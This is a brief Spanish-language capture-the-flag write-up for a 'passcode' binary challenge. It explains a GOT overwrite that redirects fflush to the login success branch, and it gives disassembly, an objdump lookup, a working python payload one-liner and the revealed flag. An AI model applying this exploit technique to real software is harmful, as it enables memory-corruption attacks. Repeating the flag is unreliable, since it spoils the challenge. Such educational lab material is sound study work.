# passcode

![passcode](https://github.com/user-attachments/assets/138a1353-14a6-4f81-a6d1-5619ea7f3394)

Queda entonces hacer que la direccion de passcode1 sea la entrada de `fflush` en la GOT y saltar a la direccion de memoria que queramos

```
...
   0x0804926b <+117>:	sub    esp,0xc
   0x0804926e <+120>:	lea    eax,[ebx-0x1fcf]
   0x08049274 <+126>:	push   eax
   0x08049275 <+127>:	call   0x8049090 <puts@plt>
   0x0804927a <+132>:	add    esp,0x10
   0x0804927d <+135>:	cmp    DWORD PTR [ebp-0x10],0x1e240
   0x08049284 <+142>:	jne    0x80492ce <login+216>
   0x08049286 <+144>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x0804928d <+151>:	jne    0x80492ce <login+216> 
   0x0804928f <+153>:	sub    esp,0xc                              <--- Queremos saltar aqui. donde el if se cumple y se imprime la flag
```

Como `scanf` acepta solo entrada numerica para `passcode1` tenemos que convertir esta direccion a un decimal con `python3 -c 'print(0x0804928f)'`

Por alguna razon pwngdb estaba fallando y no pude ejecutar el programa, asi que obtuve la direccion de `fflush` en la GOT con objdump:
```
passcode@ubuntu:~$ objdump -R passcode | grep fflush
0804c014 R_386_JUMP_SLOT   fflush@GLIBC_2.0
```

##### Resultado final:
```
passcode@ubuntu:~$ python3 -c 'import sys;sys.stdout.buffer.write(b"A"*96+b"\x14\xc0\x04\x08"+b"134517391")'|./passcode
Toddler's Secure Login System 1.1 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
enter passcode1 : Login OK!
s0rry_mom_I_just_ign0red_c0mp1ler_w4rning
Now I can safely trust you that you have credential :)
```

`s0rry_mom_I_just_ign0red_c0mp1ler_w4rning`
